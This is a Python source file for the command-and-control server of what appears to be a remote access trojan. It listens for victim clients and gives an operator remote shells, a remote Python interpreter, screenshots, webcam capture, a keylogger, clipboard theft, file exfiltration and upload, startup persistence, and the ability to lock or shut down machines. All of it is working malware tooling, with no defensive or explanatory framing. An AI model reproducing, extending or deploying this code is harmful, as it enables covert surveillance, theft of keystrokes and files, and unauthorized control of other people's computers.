import json
import logging
import os
import platform
import socket
import sys
import threading
import time
import traceback
from datetime import datetime

from cryptography.fernet import Fernet


def is_windows() -> bool:
    """ Check if Server is running Windows """
    # returns True/False
    return platform.system() == 'Windows'

if not is_windows():
    # readline allows movement with arrowkeys on linux
    try:
        import readline
    except ImportError:
        pass

logging.basicConfig(level=logging.CRITICAL)

interface_help = """--h | See this Help Message
--e | Open a shell
--i | Open Remote Python Interpreter
--g | Grabs a screenshot
--w | Grab a webcam image
--u | User Info
--k (start) (stop) (status) | Manage Keylogger
--l | Returns log from client (includes keylogs)
--s | Transfers file to Client
--r | Transfers file to Server
--d | Download file from the web
--z (file) (dir) (unzip) | Zip Files or Folders
--c | Copies to Client Clipboard
--p | Returns Client Current Clipboard
--t (add) (remove) | Manage Startup (Windows)
--q (lock) (shutdown) (restart) | Manage Client Machine (Windows)
--x (restart) (disconnect) | Manage Client Session
--b | Run Connection in Background (or CTRL-C)"""

turtle_help = """--h | See this Help Message
--l | List connected Clients
--i (ID) | Connect to a Client
--a | Broadcast command to all connected clients
--s | Shutdown Server"""


def read_file(path, block_size=32768) -> bytes:
    """ Generator for reading files """
    with open(path, 'rb') as f:
        while True:
            piece = f.read(block_size)
            if piece:
                yield piece
            else:
                return


def errors(ERROR, line=True) -> str:
    """ Error Handler """
    error_class = ERROR.__class__.__name__
    error_msg = '%s:' % error_class
    try:
        error_msg += ' {0}'.format(ERROR.args[0])
    except Exception: pass
    if line:
        try:
            _, _, tb = sys.exc_info()
            line_number = traceback.extract_tb(tb)[-1][1]
            error_msg += ' (line {0})'.format(line_number)
        except Exception: pass
    return error_msg


def shell_print(data) -> None:
    """ Support for printing more characters """
    # Mostly for tree command in Windows
    try:
        print(data.decode())
    except UnicodeDecodeError:
        try:
            print(data.decode('cp437'))
        except UnicodeDecodeError:
            print(data)
    return


def _time() -> str:
    """ Get a filename from the current time """
    # returns str
    return str(datetime.now()).replace(':','-')


def json_dumps(data) -> bytes:
    """ Dump json data and encode it """
    return json.dumps(data).encode()


def json_loads(data):
    """ Decode data and json load it """
    return json.loads(data.decode())


class Client(object):

    def __init__(self, conn, address, key) -> None:
        self.conn = conn
        self.address = address
        self.key = key
        self.fer = Fernet(key)

    def recvall(self, n) -> bytes:
        """ Function to receive n amount of bytes"""
        # returns bytes/None
        data = b''
        while len(data) < n:
            packet = self.conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def receive(self, _print=False) -> bytes:
        """ Receive Buffer Size and Data from Client """
        # returns bytes
        length = int(self.fer.decrypt(self.conn.recv(2048)).decode())
        self.conn.send(b'RECEIVED')
        received = self.fer.decrypt(self.recvall(length))
        if _print:
            print(received.decode())
        return received

    def send(self, data) -> None:
        """ Send Buffer Size and Data to Client """
        # returns None
        encrypted = self.fer.encrypt(data)
        self.conn.send(self.fer.encrypt(str(len(encrypted)).encode()))
        self.conn.recv(1024)
        self.conn.send(encrypted)

    def is_frozen(self) -> bool:
        """ Check if the client is frozen (exe) """
        # returns bool
        self.send(json_dumps(['FROZEN']))
        return json_loads(self.receive())

    def get_platform(self) -> str:
        """ Get Client Platform """
        # platform.system()
        self.send(json_dumps(['PLATFORM']))
        return self.receive().decode()

    def get_cwd(self) -> str:
        """ Get Client cwd """
        # returns cwd
        self.send(json_dumps(['GETCWD']))
        return self.receive().decode()

    def clipboard(self) -> (bool, str):
        """ Get Client Clipboard """
        # returns True/False, clipboard/error
        self.send(json_dumps(['PASTE']))
        return tuple(json_loads(self.receive()))

    def fill_clipboard(self, data) -> (bool, str):
        """ Copy to Client Clipboard"""
        # returns True/False, None/error
        self.send(json_dumps(['COPY', data]))
        return tuple(json_loads(self.receive()))

    def download(self, url, file_name) -> (bool, str):
        """ Download File To Client """
        # returns True/False, None/error
        self.send(json_dumps(['DOWNLOAD', url, file_name]))
        return tuple(json_loads(self.receive()))

    def log_path(self) -> str:
        """ Get Log File Name"""
        self.send(json_dumps(['LOG_FILE']))
        return self.receive().decode()

    def get_log(self, conn, save_as=None) -> str:
        """ Transfer log to Server """
        # save_as: file name
        if not save_as:
            save_as = '{}.log'.format(_time())
        log = self.log_path()
        self.receive_file(log, save_as)
        return save_as

    def restart_session(self) -> bool:
        """ Restart Client Session """
        # returns True
        self.send(json_dumps(['RESTART_SESSION']))
        self.receive()
        return

    def disconnect(self) -> bool:
        """ Disconnect Client """
        # returns True
        self.send(json_dumps(['DISCONNECT']))
        self.receive()
        self.conn.close()
        return

    def add_startup(self) -> (bool, str):
        """ Add Client to Startup """
        # returns True/False, None/error
        self.send(json_dumps(['ADD_STARTUP']))
        return tuple(json_loads(self.receive()))

    def remove_startup(self) -> (bool, str):
        """ Remove Client from Startup """
        # returns True/False, None/error
        self.send(json_dumps(['REMOVE_STARTUP']))
        return tuple(json_loads(self.receive()))

    def lock(self) -> bool:
        """ Lock Client Machine (Windows Only) """
        # Returns bool
        self.send(json_dumps(['LOCK']))
        return json_loads(self.receive())

    def shutdown(self) -> None:
        """ Shutdown Client Machine """
        # returns None
        self.send(json_dumps(['SHUTDOWN']))
        result = json_loads(self.receive())
        return result

    def restart(self) -> None:
        """ Restart Client Machine """
        # returns None
        self.send(json_dumps(['RESTART']))
        result = json_loads(self.receive())
        return result

    def send_file(self, file_to_transfer, save_as) -> None:
        """ Send file from Server to Client """
        # returns True/False, None/error
        self.send(json_dumps(['SEND_FILE', save_as]))
        if self.receive() == b'FILE_TRANSFER_ERROR':
            self.send(b'RECEIVED')
            return False, self.receive().decode()
        for block in read_file(file_to_transfer):
            self.send(block)
            self.receive()

        self.send(b'FILE_TRANSFER_DONE')
        self.receive()
        return True, None

    def receive_file(self, file_to_transfer, save_as) -> None:
        """ Transfer file from Client to Server """
        # returns True/False, None/error
        self.send(json_dumps(['RECEIVE_FILE', file_to_transfer]))
        with open(save_as, 'wb') as f:
            while 1:
                data = self.receive()
                if data == b'FILE_TRANSFER_ERROR':
                    self.send(b'RECEIVED')
                    return False, self.receive().decode()
                if data == b'FILE_TRANSFER_DONE':
                    self.send(b'RECEIVED')
                    break
                f.write(data)
                self.send(b'RECEIVED')
        self.receive()
        return True, None

    def screenshot(self, save_as=None) -> (bool, str):
        """ Take screenshot on Client """
        # returns True/False, None/error
        if not save_as:
            save_as = '{}.png'.format(_time())
        self.send(json_dumps(['SCREENSHOT']))
        data = self.receive()
        if data == b'ERROR':
            self.send(b'RECEIVING')
            return False, self.receive()
        with open(save_as, 'wb') as f:
            f.write(data)
        return True, save_as

    def webcam(self, save_as=None) -> (bool, str):
        """ Take a webcam shot """
        # returns True/False, save_as/None
        if not save_as:
            save_as = 'webcam-{}.png'.format(_time())
        self.send(json_dumps(['WEBCAM']))
        data = self.receive()
        if data == b'ERROR':
            return False, None
        with open(save_as, 'wb') as f:
            f.write(data)
        return True, save_as

    def exec(self, command) -> (str, str):
        """ Remote Python Interpreter """
        # returns command_output, error/None
        self.send(json_dumps(['EXEC', command]))
        return tuple(json_loads(self.receive()))

    def shell(self, command, _print=True) -> (str, str):
        """ Remote Shell with Client """
        # returns command_output
        system = self.get_platform()
        split_command = command.split(' ')[0].strip().lower()
        if split_command in ['cd', 'chdir']:
            self.send(json_dumps(['SHELL', command]))
            output = json.loads(self.receive().decode())
            if output[0] == 'ERROR':
                if _print:
                    print(output[1])
                return output[1]
            if system == 'Windows':
                if _print:
                    print()
                return '\n'
            return ''
        if split_command == 'cls' and system == 'Windows':
            os.system('cls')
            return ''
        if split_command == 'clear' and system != 'Windows':
            os.system('clear')
            return ''
        self.send(json_dumps(['SHELL', command]))
        result = []
        while 1:
            try:
                output = self.receive()
                if output == b'DONE':
                    break
                result.append(output)
                if _print:
                    shell_print(output)
                self.send(json_dumps(['LISTENING']))
            except (EOFError, KeyboardInterrupt):
                self.send(b'QUIT')
        return result

    def start_keylogger(self) -> bool:
        """ Start Keylogger """
        # returns True/False
        self.send(json_dumps(['START_KEYLOGGER']))
        return json_loads(self.receive())

    def keylogger_status(self) -> bool:
        """ Get Keylogger Status """
        # returns True/False
        self.send(json_dumps(['KEYLOGGER_STATUS']))
        return json_loads(self.receive())

    def stop_keylogger(self) -> bool:
        """ Stop Keylogger """
        # returns True/False
        self.send(json_dumps(['STOP_KEYLOGGER']))
        return json_loads(self.receive())

    def _get_info(self) -> tuple:
        """ Get Client Info """

        # returns (
        #     platform.system(),
        #     os.path.expanduser('~'),
        #     getpass.getlogin()
        # )

        self.send(json_dumps(['_INFO']))
        return tuple(json_loads(self.receive()))

    def info(self, _print=True) -> str:
        """ Get Client Info """
        # returns str
        self.send(json_dumps(['INFO']))
        return self.receive(_print=_print).decode()

    def zip_file(self, zip_filename, file_to_zip) -> (bool, str):
        """ Zip a Single File """
        # returns True/False, None/error
        self.send(json_dumps(['ZIP_FILE', zip_filename, file_to_zip]))
        return tuple(json_loads(self.receive()))

    def zip_dir(self, zip_filename, dir_to_zip) -> (bool, str):
        """ Zip a Directory """
        # returns True/False, None/error
        self.send(json_dumps(['ZIP_DIR', os.path.splitext(zip_filename)[0], dir_to_zip]))
        return tuple(json_loads(self.receive()))

    def unzip(self, zip_filename) -> (bool, str):
        """ Unzip a File """
        # returns True/False, None/error
        self.send(json_dumps(['UNZIP', zip_filename]))
        return tuple(json_loads(self.receive()))


class MultiServer(object):

    def __init__(self, port, key=b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=') -> None:
        self.host = ''
        self.port = port
        self.socket = None
        self.key = key
        self.clients = []

    def socket_create(self) -> None:
        """ Create Socket """
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            logging.error("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self) -> None:
        """ Bind socket to port and wait for connection from client """
        # returns None
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            logging.error("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self, _print=False) -> None:
        """ Accepts incoming connections and agrees on a AES key using RSA"""
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)

                hostname = conn.recv(4096).decode()
                address = address + (hostname,)

                client = Client(conn, address, self.key)
                self.clients.append(client)
                if _print:
                    msg = 'Connection has been established: {0} ({1})'.format(address[0], address[-1])
                    print('\n{0}\n{1}\n{0}'.format('-' * len(msg), msg))
            except Exception as e:
                logging.debug(errors(e))

    def del_client(self, client) -> None:
        try:
            self.clients.remove(client)
            client.conn.close()
        except Exception: pass
        return

    def refresh_connections(self) -> None:
        """ Refreshes connections """
        clients = self.clients[:]
        for client in clients:
            try:
                client.send(json_dumps(['LIST']))
                client.conn.recv(20480)
            except:
                self.del_client(client)

    def list_connections(self) -> None:
        """ List all connections """
        self.refresh_connections()
        print('----- Clients -----')
        for i, client in enumerate(self.clients):
            print('   '.join(map(str, (i, ) + client.address)))
        return

    def get_target(self, cmd) -> socket.socket:
        """ Select target client """
        # returns socket.socket()
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
            client = self.clients[target]
        except (ValueError, IndexError):
            logging.error('Not a valid selection')
            return None
        print("You are now connected to " + str(client.address[2]))
        return client

    def python_interpreter(self, client) -> None:
        """ Remote Python Interpreter CLI"""
        # returns None
        print('CAUTION! Using this feature wrong can break the client until restarted.')
        print('Tip: help("modules") lists available modules')
        while 1:
            command = input('>>> ')
            if command in ['exit', 'exit()']:
                break
            output, error = client.exec(command)
            if error != None:
                print(error)
                continue
            if output != '':
                print(output, end='')

    def shell(self, client) -> None:
        """ Remote Shell Interface """
        # returns None
        command = ''
        system, home, user = client._get_info()
        hostname = client.address[-1]

        while 1:
            cwd = client.get_cwd()
            if not system == 'Windows':
                cwd = cwd.replace(home, '~')
                _input = '{0}@{1}:{2}$ '.format(user, hostname, cwd)
            else:
                _input = '{0}>'.format(cwd)

            command = input(_input)
            if command.strip() == '':
                continue
            if command == 'exit':
                break
            client.shell(command)

    def selector(self, client, command) -> bool:
        """ Command selector interface """
        # returns True/None
        select = command[4:].strip()
        command = command[:3].lower()
        if '--h' in command:
            print(interface_help)
            return
        if '--e' in command:
            try:
                self.shell(client)
            except (EOFError, KeyboardInterrupt):
                print()
            return
        if '--i' in command:
            try:
                self.python_interpreter(client)
            except (EOFError, KeyboardInterrupt):
                print()
            return
        if '--g' in command:
            print('Taking Screenshot...')
            result, error = client.screenshot()
            if result:
                print('Saved Screenshot.')
            else:
                print('Error Taking Screenshot: {}'.format(error.decode()))
            return
        if '--w' in command:
            print('Accessing webcam...')
            result, save_as = client.webcam()
            if result:
                print('Saved webcam image')
            else:
                print('Error capturing Webcam image')
            return
        if '--u' in command:
            client.info()
            return
        if command == '--k':
            if select == 'start':
                if client.start_keylogger():
                    print('Started Keylogger')
                else:
                    print('Keylogger ImportError')
                return
            if select == 'status':
                if client.start_keylogger():
                    print('Keylogger Running')
                else:
                    print('Keylogger is not running.')
                return
            if select == 'stop':
                if client.stop_keylogger():
                    print('Stopped Keylogger')
                else:
                    print('Keylogger ImportError')
                return
            print("Invalid Argument: '--h' for help")
            return
        if '--l' in command:
            print('Transferring log...')
            log = client.get_log()
            print('Log saved as: {}'.format(log))
            return
        if '--s' in command:
            file_to_transfer = input('File to Transfer to Client: ')
            save_as = input('Save as: ')
            print('Transferring file...')
            result, error = client.send_file(file_to_transfer, save_as)
            if result:
                print('File transferred.')
            else:
                print('Error transferring file: {}'.format(error))
            return
        if '--r' in command:
            file_to_transfer = input('File to Transfer to Server: ')
            save_as = input('Save as: ')
            print('Transferring file...')
            result, error = client.receive_file(file_to_transfer, save_as)
            if result:
                print('File transferred.')
            else:
                print('Error transferring file: {}'.format(error))
            return
        if '--d' in command:
            file_url = input('File URL: ')
            file_name = input('Filename: ')
            print('Downloading File...')
            result, error = client.download(file_url, file_name)
            if result:
                print('Downloaded file successfully')
            else:
                print(error)
            return
        if command == '--z':
            if select == 'file':
                save_as = input('Zip Filename: ')
                file_to_zip = input('File to Zip: ')
                result, error = client.zip_file(save_as, file_to_zip)
                if result:
                    print('Zipping Successful.')
                else:
                    print(error)
                return
            if select == 'dir':
                save_as = input('Zip Filename: ')
                dir_to_zip = input('Directory to Zip: ')
                result, error = client.zip_dir(save_as, dir_to_zip)
                if result:
                    print('Zipped Directory Successfully.')
                else:
                    print(error)
                return
            if select == 'unzip':
                zip_filename = input('Zip File: ')
                result, error = client.unzip(zip_filename)
                if result:
                    print('Unzipped Successfully.')
                else:
                    print(error)
                return
        if '--c' in command:
            text_to_copy = input('Text to copy: ')
            result, error = client.fill_clipboard(text_to_copy)
            if result:
                print('Copied to Clipboard.')
            else:
                print(error)
            return
        if '--p' in command:
            _, output = client.clipboard()
            print(output)
            return
        if command == '--t':
            if select == 'add':
                result, error = client.add_startup()
                if result:
                    print('Client added to Startup')
                else:
                    print(error)
                return
            if select == 'remove':
                result, error = client.remove_startup()
                if result:
                    print('Removed Client from Startup')
                else:
                    print(error)
                return
            print("Invalid Argument: '--h' for help")
            return
        if command == '--q':
            if select == 'lock':
                if client.lock():
                    print('Locked Client Machine')
                else:
                    print('Locking is only available on Windows.')
                return
            elif select == 'shutdown':
                result = client.shutdown()
                if result:
                    print('Shutting down Client Machine')
                else:
                    print('Shutdown is only available on Windows.')
                return result
            elif select == 'restart':
                result = client.restart()
                if result:
                    print('Restarting Client Machine')
                else:
                    print('Restart is only available on Windows.')
                return result
            print("Invalid Argument: '--h' for help")
            return
        if command == '--x':
            if select == 'restart':
                print('Restarting Session...')
                client.restart_session()
                self.refresh_connections()
                return True
            elif select == 'disconnect':
                print('Disconnecting Client...')
                client.disconnect()
                self.refresh_connections()
                return True
            print("Invalid Argument: '--h' for help")
            return
        if '--b' in command:
            return True
        print("Invalid command: '--h' for help.")

    def broadcast(self, command) -> None:
        """ Broadcast a command to all connected Clients """
        # returns None
        clients = self.clients[:]
        for client in clients:
            try:
                print('Response from {0}:'.format(client.address[0]))
                self.selector(client, command)
            except Exception as e:
                print(errors(e))

    def interface(self, client) -> None:
        """ CLI Interface to Client """
        # returns None
        ip = client.address[0]
        while True:
            command = input('{0}> '.format(ip))
            if self.selector(client, command):
                break

    def turtle(self) -> None:
        """ Connection Selector """
        # returns None
        print("Type '--h' for help")
        while True:
            try:
                command = input('> ')
                if command == '--h':
                    print(turtle_help)
                elif command[:3] == '--a':
                    self.broadcast(input('Command to broadcast: '))
                elif command == '--l':
                    self.list_connections()
                elif '--i' in command:
                    client = self.get_target(command)
                    if client:
                        try:
                            self.interface(client)
                        except (EOFError, KeyboardInterrupt):
                            print()
                        except Exception as e:
                            print('Connection lost: {}'.format(errors(e)))
                            self.del_client(client)
                            self.refresh_connections()
                    else:
                        print('Invalid Selection.')
                elif command == '--s':
                    raise EOFError
                else:
                    print("Invalid command: '--h' for help.")
            except (EOFError, KeyboardInterrupt):
                print('\nShutting down Server...')
                time.sleep(2)
                break
            except Exception as e:
                print(errors(e))


def accept_conns(server) -> None:
    """ Function to accept connections """
    # Returns None
    server.socket_create()
    server.socket_bind()
    server.accept_connections(_print=True)
    return


def accept_thread(server) -> None:
    """ Runs function to accept connections in thread """
    # Returns None
    t = threading.Thread(target=accept_conns, args=(server,))
    t.daemon = True
    t.start()
    return


if __name__ == '__main__':
    server = MultiServer(8000)
    accept_thread(server)
    server.turtle()
